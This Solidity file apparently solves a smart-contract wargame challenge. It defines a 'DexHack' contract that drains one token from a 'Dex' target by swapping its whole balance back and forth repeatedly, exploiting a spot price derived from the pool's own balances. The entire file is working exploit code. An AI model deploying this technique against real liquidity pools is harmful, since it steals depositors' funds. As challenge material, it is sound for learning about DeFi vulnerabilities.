// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Dex, IERC20} from "./Dex.sol";

contract DexHack {
    error AttackFailed();

    Dex private immutable TARGET;
    IERC20 private immutable A;
    IERC20 private immutable B;

    constructor(address _target) {
        TARGET = Dex(_target);
        A = IERC20(TARGET.token1());
        B = IERC20(TARGET.token2());
    }

    function attack() external {
        A.transferFrom(msg.sender, address(this), 10);
        B.transferFrom(msg.sender, address(this), 10);
        A.approve(address(TARGET), type(uint256).max);
        B.approve(address(TARGET), type(uint256).max);
        _swap(A, B);
        _swap(B, A);
        _swap(A, B);
        _swap(B, A);
        _swap(A, B);
        TARGET.swap(address(B), address(A), 45);
        if (A.balanceOf(address(TARGET)) != 0) revert AttackFailed();
    }

    function _swap(IERC20 _tokenIn, IERC20 _tokenOut) private {
        TARGET.swap(address(_tokenIn), address(_tokenOut), _tokenIn.balanceOf(address(this)));
    }
}
